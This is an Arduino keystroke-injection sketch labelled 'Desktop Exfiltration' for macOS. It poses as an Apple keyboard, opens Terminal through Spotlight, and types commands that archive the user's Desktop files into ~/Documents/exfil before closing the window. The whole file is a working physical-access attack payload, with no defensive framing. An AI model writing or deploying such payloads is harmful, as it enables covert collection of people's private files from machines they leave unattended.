#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Compress and prepare Desktop for exfiltration
  // Creates archive in ~/Documents/exfil/
  // Author: Generated
  // Title: Desktop Exfiltration
  // Target: macOS
  // Version: 1.0
  // Category: Exfiltration
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("mkdir -p ~/Documents/exfil");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("cd ~/Documents/exfil && tar -czf desktop_backup_$(date +%Y%m%d).tar.gz ~/Desktop/* 2>/dev/null || echo 'Empty desktop' > desktop_backup_$(date +%Y%m%d).txt");

  typeKey(KEY_RETURN);

  delay(3000);

  Keyboard.print("ls -lah ~/Documents/exfil/");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}